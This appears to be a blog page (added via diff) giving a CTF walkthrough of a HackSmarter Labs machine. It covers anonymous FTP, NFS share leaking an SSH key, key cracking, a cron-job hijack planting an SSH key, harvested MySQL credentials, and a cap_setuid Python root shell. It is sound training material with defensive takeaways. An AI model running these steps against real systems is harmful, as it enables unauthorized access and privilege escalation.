@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ascension - HackSmarter Labs CTF Walkthrough | Zerotrace Logs</title>
+  <meta name="description" content="Complete walkthrough of Ascension machine from HackSmarter Labs. Learn FTP enumeration, NFS misconfiguration, SSH key cracking, cron job exploitation, MySQL enumeration, and Linux capabilities privilege escalation." />
+
+  <!-- Essential Open Graph tags for LinkedIn -->
+  <meta property="og:title" content="Ascension CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
+  <meta property="og:description" content="Complete walkthrough covering FTP enumeration, NFS misconfiguration, SSH key cracking, cron job exploitation, and Linux capabilities abuse for privilege escalation." />
+  <meta property="og:image" content="https://z3rotrace.live/assets/ascension/python-setuid-cap.png" />
+  <meta property="og:url" content="https://z3rotrace.live/writeups/ascension.html" />
+  <meta property="og:type" content="article" />
+
+  <!-- Twitter Card tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Ascension CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
+  <meta name="twitter:description" content="Complete walkthrough covering FTP enumeration, NFS misconfiguration, SSH key cracking, cron job exploitation, and Linux capabilities abuse for privilege escalation." />
+  <meta name="twitter:image" content="https://z3rotrace.live/assets/ascension/python-setuid-cap.png" />
+
+  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
+  <link rel="apple-touch-icon" href="../assets/favicon.png" />
+  <link rel="stylesheet" href="../style.css?v=4"/>
+  <style>
+    /* Machine info box styling */
+    .machine-info {
+      background: rgba(0, 170, 255, 0.05);
+      border: 1px solid rgba(0, 170, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .machine-info ul {
+      margin: 0;
+      padding-left: 0;
+    }
+
+    .machine-info li {
+      margin-bottom: 0.25rem;
+    }
+
+    .machine-info li::before {
+      color: #00aaff;
+    }
+
+    /* Attack chain summary box */
+    .attack-chain {
+      background: rgba(199, 125, 255, 0.05);
+      border: 1px solid rgba(199, 125, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .attack-chain ol {
+      margin: 0;
+    }
+
+    /* Tool list styling */
+    .tools-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin: 1rem 0;
+      padding: 0;
+    }
+
+    .tools-list li {
+      background: rgba(0, 170, 255, 0.08);
+      border: 1px solid rgba(0, 170, 255, 0.2);
+      border-radius: 6px;
+      padding: 0.4rem 0.8rem;
+      font-size: 0.9rem;
+      margin: 0;
+    }
+
+    .tools-list li::before {
+      content: none;
+    }
+
+    /* Flags table styling */
+    .flags-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.5rem 0;
+      background: rgba(0, 170, 255, 0.03);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .flags-table th,
+    .flags-table td {
+      padding: 0.75rem 1rem;
+      text-align: left;
+      border-bottom: 1px solid rgba(0, 170, 255, 0.15);
+    }
+
+    .flags-table th {
+      background: rgba(0, 170, 255, 0.08);
+      color: #00aaff;
+      font-weight: 600;
+    }
+
+    .flags-table tr:last-child td {
+      border-bottom: none;
+    }
+
+    .flags-table tr:hover {
+      background: rgba(0, 170, 255, 0.05);
+    }
+
+    /* Lessons learned styling */
+    .lessons-learned li {
+      margin-bottom: 0.75rem;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <h1 class="terminal-title" aria-label="Zerotrace Logs">
+    <span class="prompt" aria-hidden="true">$</span>
+    <span class="typed" id="term-typing" aria-hidden="true"></span>
+    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
+    <span class="sr-only">Zerotrace Logs</span>
+  </h1>
+</header>
+
+<!-- Side hamburger control -->
+<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
+  <span class="sr-only">Toggle navigation</span>
+  <span class="hamburger-icon" aria-hidden="true"></span>
+</button>
+
+<!-- Sidebar navigation -->
+<aside class="sidebar" id="sidebar" aria-label="Main navigation">
+  <div class="sidebar-header">
+    <h3>Navigate</h3>
+    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">x</span></button>
+  </div>
+  <div class="sidebar-content">
+    <ul class="sidebar-nav">
+      <li><a href="../index.html">Home</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Writeups</button>
+        <ul class="submenu">
+          <li><a href="welcome.html">Welcome - ADCS ESC1</a></li>
+          <li><a href="staged.html">Staged - HackSmarter Labs</a></li>
+          <li><a href="buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
+          <li><a href="arasaka.html">Arasaka - HackSmarter Labs</a></li>
+          <li><a href="midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
+          <li><a href="banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
+          <li><a href="ascension.html" aria-current="page">Ascension - HackSmarter Labs</a></li>
+          <li><a href="slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
+          <li><a href="sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
+        </ul>
+      </li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Machines Walkthroughs</button>
+        <ul class="submenu" hidden>
+          <li><a href="../walkthroughs/sharethepain.html">ShareThePain</a></li>
+          <li><a href="../walkthroughs/sysco.html">Sysco</a></li>
+        </ul>
+      </li>
+      <li><a href="../vector3.html">Certification Journey</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Projects</button>
+        <ul class="submenu" hidden>
+          <li><a href="../projects/dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+</aside>
+<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
+
+<section>
+  <h2>Ascension - HackSmarter Labs CTF Walkthrough</h2>
+
+  <div class="machine-info">
+    <ul>
+      <li><strong>Platform:</strong> HackSmarter Labs</li>
+      <li><strong>Difficulty:</strong> Medium</li>
+      <li><strong>Key Topics:</strong> FTP Enumeration, NFS Misconfiguration, SSH Key Cracking, Cron Job Exploitation, MySQL Enumeration, Linux Capabilities Privilege Escalation</li>
+    </ul>
+  </div>
+
+  <h2>Reconnaissance</h2>
+
+  <h3><span class="step">[Step 1]</span> Port Scanning</h3>
+  <p>I started with a RustScan to identify open services on the target:</p>
+  <pre><code>$ rustscan -a 10.0.26.230 -- -A</code></pre>
+
+  <pre><code>PORT      STATE SERVICE  VERSION
+21/tcp    open  ftp      vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             202 Sep 21 00:04 pwlist.txt
+22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
+80/tcp    open  http     Apache httpd 2.4.58 ((Ubuntu))
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+2049/tcp  open  nfs_acl  3 (RPC #100227)
+34949/tcp open  mountd   1-3 (RPC #100005)
+38757/tcp open  mountd   1-3 (RPC #100005)
+39903/tcp open  nlockmgr 1-4 (RPC #100021)
+50651/tcp open  mountd   1-3 (RPC #100005)
+53725/tcp open  status   1 (RPC #100024)</code></pre>
+
+  <p>Key findings from the scan:</p>
+  <ul>
+    <li><strong>FTP (21)</strong> - Anonymous login allowed with a <code>pwlist.txt</code> file visible</li>
+    <li><strong>SSH (22)</strong> - OpenSSH 9.6p1 running</li>
+    <li><strong>HTTP (80)</strong> - Apache default page</li>
+    <li><strong>NFS (2049)</strong> - Network File System available for mounting</li>
+  </ul>
+
+  <h3><span class="step">[Step 2]</span> FTP Enumeration</h3>
+  <p>The scan revealed anonymous FTP access. I connected and grabbed the password list:</p>
+  <pre><code>$ ftp 10.0.26.230
+Connected to 10.0.26.230.
+220 (vsFTPd 3.0.5)
+Name (10.0.26.230:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+ftp> ls
+-rw-r--r--    1 0        0             202 Sep 21 00:04 pwlist.txt
+ftp> get pwlist.txt
+226 Transfer complete.
+ftp> exit</code></pre>
+
+  <p>The password list contained common passwords:</p>
+  <pre><code>password1
+123456
+letmein
+qwerty
+.....</code></pre>
+
+  <h3><span class="step">[Step 3]</span> NFS Enumeration</h3>
+  <p>I checked for NFS shares available on the target:</p>
+  <pre><code>$ showmount -e 10.0.26.230</code></pre>
+
+  <pre><code>Export list for 10.0.26.230:
+/srv/nfs/user1 *</code></pre>
+
+  <div class="question">
+    <strong>What is NFS?</strong>
+  </div>
+  <div class="answer">
+    Network File System (NFS) allows remote systems to mount directories over a network. When configured with <code>*</code> as the allowed hosts, anyone can mount the share - a common misconfiguration that can expose sensitive files.
+  </div>
+
+  <p>I mounted the NFS share locally:</p>
+  <pre><code>$ mkdir target-NFS
+$ sudo mount -t nfs 10.0.26.230:/srv/nfs/user1 ./target-NFS -o nolock</code></pre>
+
+  <p>Inside the share, I found SSH keys:</p>
+  <pre><code>$ ls target-NFS/
+id_rsa  id_rsa.pub</code></pre>
+
+  <p>Examining the public key revealed the associated username:</p>
+  <p><img src="../assets/ascension/ssh-pubkey-user1.png" alt="Public SSH key showing user1 as the owner" loading="lazy"></p>
+
+  <p>The share name <code>/srv/nfs/user1</code> also hinted at the username being <code>user1</code>.</p>
+
+  <h2>Initial Access</h2>
+
+  <h3><span class="step">[Step 4]</span> Cracking the SSH Key</h3>
+  <p>The private key was password-protected. I first tried the <code>pwlist.txt</code> wordlist from FTP, but it did not work. I then used <code>rockyou.txt</code> with John the Ripper:</p>
+  <pre><code>$ ssh2john target-NFS/id_rsa > ssh.hash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash</code></pre>
+
+  <div class="question">
+    <strong>What is ssh2john?</strong>
+  </div>
+  <div class="answer">
+    <code>ssh2john</code> is a utility that converts password-protected SSH private keys into a hash format that John the Ripper can crack. It extracts the encrypted key material and outputs it in a format suitable for offline password attacks.
+  </div>
+
+  <p><img src="../assets/ascension/john-ssh-crack.png" alt="John the Ripper successfully cracking the SSH key passphrase as sammie1" loading="lazy"></p>
+
+  <p>The passphrase was cracked: <code>sammie1</code></p>
+
+  <h3><span class="step">[Step 5]</span> SSH Access as user1</h3>
+  <p>With the cracked passphrase, I connected to the target as <code>user1</code>:</p>
+  <pre><code>$ ssh -i target-NFS/id_rsa user1@10.0.26.230
+Enter passphrase for key 'target-NFS/id_rsa': sammie1</code></pre>
+
+  <p><img src="../assets/ascension/ssh-user1-shell.png" alt="Successful SSH connection as user1" loading="lazy"></p>
+
+  <div class="note">
+    <strong>Flag 1</strong> found at <code>/opt/user1/flag1.txt</code>
+  </div>
+
+  <h2>Lateral Movement: user1 to user2</h2>
+
+  <h3><span class="step">[Step 6]</span> Process Monitoring with pspy</h3>
+  <p>I transferred <code>pspy64</code> to the target to monitor processes running as other users:</p>
+
+  <div class="question">
+    <strong>What is pspy?</strong>
+  </div>
+  <div class="answer">
+    pspy is a command-line tool that monitors Linux processes without requiring root privileges. It is useful for discovering cron jobs and scheduled tasks that may be exploitable.
+  </div>
+
+  <p>I discovered a script being executed by UID 1002:</p>
+  <p><img src="../assets/ascension/pspy-backup-cron.png" alt="pspy output showing /tmp/backup.sh executed by UID=1002" loading="lazy"></p>
+
+  <p>I identified the user associated with UID 1002:</p>
+  <pre><code>user1@ip-10-0-26-230:/tmp$ getent passwd 1002
+user2:x:1002:1002::/home/user2:/bin/bash</code></pre>
+
+  <h3><span class="step">[Step 7]</span> Exploiting the Cron Job</h3>
+  <p>The cron job executed <code>/tmp/backup.sh</code>, which did not exist. Since <code>/tmp</code> is world-writable, I created a malicious script to add my SSH public key to <code>user2</code>'s authorized_keys:</p>
+  <pre><code>#!/bin/bash
+mkdir -p /home/user2/.ssh
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... kali@kali" >> /home/user2/.ssh/authorized_keys
+chmod 700 /home/user2/.ssh
+chmod 600 /home/user2/.ssh/authorized_keys</code></pre>
+
+  <div class="note">
+    <strong>Why does this work?</strong> When a cron job runs a script that does not exist in a world-writable directory like <code>/tmp</code>, any user can create that script. The cron job will then execute our malicious code with the privileges of the user who owns the cron job (in this case, <code>user2</code>).
+  </div>
+
+  <p>After waiting for the cron job to execute, I connected as <code>user2</code>:</p>
+  <pre><code>$ ssh user2@10.0.26.230
+user2@ip-10-0-26-230:~$</code></pre>
+
+  <div class="note">
+    <strong>Flag 2</strong> found at <code>/opt/user2/flag2.txt</code>
+  </div>
+
+  <h2>Lateral Movement: user2 to user3</h2>
+
+  <h3><span class="step">[Step 8]</span> WordPress Configuration Discovery</h3>
+  <p>I ran <code>linpeas.sh</code> for automated enumeration and found WordPress database credentials:</p>
+  <p><img src="../assets/ascension/linpeas-wpconfig.png" alt="LinPEAS output showing wp-config.php with database credentials" loading="lazy"></p>
+
+  <ul>
+    <li><strong>Database:</strong> wordpress</li>
+    <li><strong>User:</strong> wpuser</li>
+    <li><strong>Password:</strong> wppassword</li>
+  </ul>
+
+  <p>I also confirmed MySQL was running locally:</p>
+  <p><img src="../assets/ascension/mysql-socket.png" alt="Socket statistics showing MySQL listening on localhost:3306" loading="lazy"></p>
+
+  <h3><span class="step">[Step 9]</span> Database Enumeration</h3>
+  <p>I connected to MySQL and enumerated the database:</p>
+  <pre><code>user2@ip-10-0-26-230:~$ mysql -u wpuser -p
+Enter password: wppassword</code></pre>
+
+  <pre><code>mysql> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| performance_schema |
+| wordpress          |
++--------------------+
+
+mysql> USE wordpress;
+mysql> SHOW TABLES;
++---------------------+
+| Tables_in_wordpress |
++---------------------+
+| flags               |
+| users               |
++---------------------+</code></pre>
+
+  <p><strong>Flag 4</strong> retrieved from the <code>flags</code> table:</p>
+  <pre><code>mysql> SELECT flag FROM flags;
++------------------------------------------+
+| flag                                     |
++------------------------------------------+
+| RkxBRzR...                               |
++------------------------------------------+</code></pre>
+
+  <p>I also found credentials for <code>user3</code>:</p>
+  <pre><code>mysql> SELECT * FROM users;
++----+----------+---------------+
+| id | username | password      |
++----+----------+---------------+
+|  1 | user3    | user3password |
++----+----------+---------------+</code></pre>
+
+  <h3><span class="step">[Step 10]</span> Switching to user3</h3>
+  <pre><code>user2@ip-10-0-26-230:~$ su user3
+Password: user3password
+user3@ip-10-0-26-230:~$</code></pre>
+
+  <h2>Privilege Escalation: user3 to root</h2>
+
+  <h3><span class="step">[Step 11]</span> Linux Capabilities Abuse</h3>
+  <p>In <code>user3</code>'s home directory, I found a suspicious Python binary. I checked for Linux capabilities:</p>
+  <pre><code>user3@ip-10-0-26-230:~$ getcap -r / 2>/dev/null</code></pre>
+
+  <p><img src="../assets/ascension/python-setuid-cap.png" alt="getcap output showing python3 with cap_setuid=ep capability" loading="lazy"></p>
+
+  <p>The custom Python binary at <code>/home/user3/python3</code> had the <code>cap_setuid=ep</code> capability.</p>
+
+  <div class="question">
+    <strong>What are Linux Capabilities?</strong>
+  </div>
+  <div class="answer">
+    Linux capabilities allow fine-grained control over privileges instead of the traditional all-or-nothing root model. The <code>cap_setuid</code> capability permits a process to change its user ID. When set on an interpreter like Python, it can be abused to escalate to root by calling <code>os.setuid(0)</code>.
+  </div>
+
+  <h3><span class="step">[Step 12]</span> Root Shell</h3>
+  <p>I used the Python binary to escalate to root:</p>
+  <pre><code>user3@ip-10-0-26-230:~$ /home/user3/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@ip-10-0-26-230:~#</code></pre>
+
+  <div class="note">
+    <strong>Flag 5</strong> found at <code>/opt/user3/flag5.txt</code>
+  </div>
+
+  <div class="note">
+    <strong>Flag 6</strong> found at <code>/opt/root/flag6.txt</code>
+  </div>
+
+  <h2>Flags Summary</h2>
+
+  <table class="flags-table">
+    <thead>
+      <tr>
+        <th>Flag</th>
+        <th>Location</th>
+        <th>How Obtained</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Flag 1</td>
+        <td><code>/opt/user1/flag1.txt</code></td>
+        <td>Initial access as user1 via NFS-leaked SSH key</td>
+      </tr>
+      <tr>
+        <td>Flag 2</td>
+        <td><code>/opt/user2/flag2.txt</code></td>
+        <td>Lateral movement via cron job exploitation</td>
+      </tr>
+      <tr>
+        <td>Flag 3</td>
+        <td><code>/opt/ftpuser/flag3.txt</code></td>
+        <td>Accessible after gaining foothold (FTP user's directory)</td>
+      </tr>
+      <tr>
+        <td>Flag 4</td>
+        <td>MySQL <code>wordpress.flags</code> table</td>
+        <td>Database enumeration with discovered credentials</td>
+      </tr>
+      <tr>
+        <td>Flag 5</td>
+        <td><code>/opt/user3/flag5.txt</code></td>
+        <td>Lateral movement via MySQL stored credentials</td>
+      </tr>
+      <tr>
+        <td>Flag 6</td>
+        <td><code>/opt/root/flag6.txt</code></td>
+        <td>Privilege escalation via Python capabilities abuse</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>Attack Chain Summary</h2>
+  <div class="attack-chain">
+    <ol>
+      <li><strong>Anonymous FTP:</strong> Retrieved password wordlist from exposed FTP server</li>
+      <li><strong>NFS Misconfiguration:</strong> Mounted world-readable share containing SSH private key</li>
+      <li><strong>SSH Key Cracking:</strong> Used John the Ripper to crack weak key passphrase</li>
+      <li><strong>Initial Access:</strong> SSH as user1 with cracked key</li>
+      <li><strong>Cron Job Hijack:</strong> Created missing script in /tmp to pivot to user2</li>
+      <li><strong>WordPress Credentials:</strong> Found MySQL credentials in wp-config.php</li>
+      <li><strong>Database Enumeration:</strong> Retrieved user3 password from MySQL</li>
+      <li><strong>Capabilities Abuse:</strong> Exploited cap_setuid on Python binary for root</li>
+    </ol>
+  </div>
+
+  <h2>Tools Used</h2>
+  <ul class="tools-list">
+    <li><strong>RustScan</strong> - Fast port scanning</li>
+    <li><strong>FTP</strong> - Anonymous file retrieval</li>
+    <li><strong>showmount</strong> - NFS share enumeration</li>
+    <li><strong>ssh2john</strong> - SSH key hash extraction</li>
+    <li><strong>John the Ripper</strong> - Password cracking</li>
+    <li><strong>pspy</strong> - Process monitoring</li>
+    <li><strong>LinPEAS</strong> - Automated enumeration</li>
+    <li><strong>MySQL</strong> - Database enumeration</li>
+    <li><strong>getcap</strong> - Capability discovery</li>
+  </ul>
+
+  <h2>Key Takeaways</h2>
+  <div class="answer lessons-learned">
+    <p>This machine demonstrated a chain of common misconfigurations:</p>
+    <ol>
+      <li><strong>Anonymous FTP</strong> - Exposed a password wordlist that hinted at weak credentials in the environment</li>
+      <li><strong>Misconfigured NFS</strong> - World-readable exports (<code>*</code>) leaked SSH private keys</li>
+      <li><strong>Weak SSH key passphrase</strong> - The key passphrase was crackable with rockyou.txt</li>
+      <li><strong>Insecure cron job</strong> - Executed a non-existent script from a world-writable location</li>
+      <li><strong>Hardcoded database credentials</strong> - WordPress <code>wp-config.php</code> contained plaintext credentials</li>
+      <li><strong>Plaintext passwords in database</strong> - Allowed lateral movement to another user</li>
+      <li><strong>Dangerous Linux capabilities</strong> - <code>cap_setuid</code> on a Python binary provided instant root access</li>
+    </ol>
+    <p>Each step in this attack chain represents a common real-world misconfiguration. The key lesson is that security failures rarely exist in isolation - attackers chain together multiple weaknesses to achieve their objectives.</p>
+  </div>
+
+  <p><em>Walkthrough by Zerotrace | HackSmarter Labs</em></p>
+
+</section>
+
+<footer>
+  <div class="social-links" aria-label="Social media">
+    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
+      </svg>
+    </a>
+    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
+      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
+        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
+      </svg>
+    </a>
+    <a href="https://www.linkedin.com/in/panagiotis-lampousis-2a100b392/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
+      </svg>
+    </a>
+  </div>
+  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
+</footer>
+<script src="../script.js"></script>
+</body>
+</html>
